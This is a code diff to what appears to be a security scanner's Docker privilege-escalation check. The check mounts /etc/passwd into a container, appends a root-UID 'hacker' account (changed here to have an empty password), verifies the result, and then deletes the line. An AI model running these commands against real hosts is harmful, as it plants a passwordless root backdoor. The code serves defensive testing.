@@ -40,7 +40,7 @@ class ElevatePrivilegeCheck(VulnerabilityCheck):
             trace.append("Connecting to Docker client...")
             client = from_env()
 
-            write_cmd = "sh -c 'echo 'hacker:x:0:0:Hacker:/root:/bin/sh' >> /mnt/passwd && cat /mnt/passwd | grep hacker'"
+            write_cmd = "sh -c 'echo 'hacker::0:0:Hacker:/root:/bin/sh' >> /mnt/passwd && cat /mnt/passwd | grep hacker'"
             trace.append("Attempting to run alpine container with mounted volume...")
             trace.append(
                 f"Command: docker run --rm -v /etc/passwd:/mnt/passwd:rw alpine {write_cmd}"
@@ -55,14 +55,14 @@ class ElevatePrivilegeCheck(VulnerabilityCheck):
             trace.append("Container execution completed.")
             response_str = response.decode('utf-8').strip()
 
-            if "hacker:x:0:0:Hacker:/root:/bin/sh" not in response_str:
+            if "hacker::0:0:Hacker:/root:/bin/sh" not in response_str:
                 trace.append("Privilege escalation attempt failed or blocked.")
                 return self._get_safe_result(trace)
 
             trace.append("Privilege escalation attempt succeeded.")
 
             trace.append("Reverting changes to /etc/passwd...")
-            cleanup_cmd = "sed '\\#hacker:x:0:0:Hacker:/root:/bin/sh#d' /mnt/passwd > /tmp/passwd && cat /tmp/passwd > /mnt/passwd"
+            cleanup_cmd = "sed '\\#hacker::0:0:Hacker:/root:/bin/sh#d' /mnt/passwd > /tmp/passwd && cat /tmp/passwd > /mnt/passwd"
             trace.append(
                 f"Command: docker run --rm -v /etc/passwd:/mnt/passwd:rw alpine sh -c '{cleanup_cmd}'"
             )
